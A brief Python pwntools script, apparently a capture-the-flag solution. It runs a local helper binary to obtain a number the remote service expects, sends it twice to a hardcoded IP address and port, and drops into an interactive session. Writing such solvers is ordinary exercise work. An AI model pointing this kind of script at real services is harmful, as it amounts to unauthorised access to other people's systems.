from pwn import *

p = remote("157.245.147.89",28333)
g = process("./a.out")
requirement = int(g.recv().strip(b'\n').decode())
print(hex(requirement))
p.recv()
p.sendline(str(requirement).encode())
p.sendline(str(requirement).encode())
p.interactive()